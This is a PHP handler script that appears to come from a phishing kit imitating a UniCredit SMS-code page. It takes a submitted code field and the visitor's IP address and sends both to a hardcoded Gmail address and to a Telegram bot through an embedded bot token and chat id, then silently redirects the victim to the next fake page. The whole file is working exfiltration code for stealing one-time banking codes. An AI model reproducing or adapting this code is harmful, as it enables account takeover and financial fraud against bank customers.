<?php
ob_start();
include('loading2.php');
$pg=$_REQUEST['page'];
$pg1=$_REQUEST['page1'];
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index3.php?page=$pg&page1=$pg1" ;
$hostname = gethostbyaddr($ip);
$message .= "".$_POST['sm']."\n";
$message .= " IP ".$ip."\n";
$send = "unicredit.unic@gmail.com";
$subject = "$ip";
$headers = "From: SMS1 ARMEX <don@cool.com>";
mail($send,$subject,$message,$headers);
// TELEGRAM	
	function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '6187732934:AAHTMMGqRAAEbHHML7UMX9OQsXzIrlnvH1c';
    $chat_id  = '1532506490';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
	
}
telegram_send(urlencode($message));
// TELEGRAM
header("Refresh:3; url='./index3.php?page=$pg&page1=$pg1'");
ob_end_flush();
exit;
?>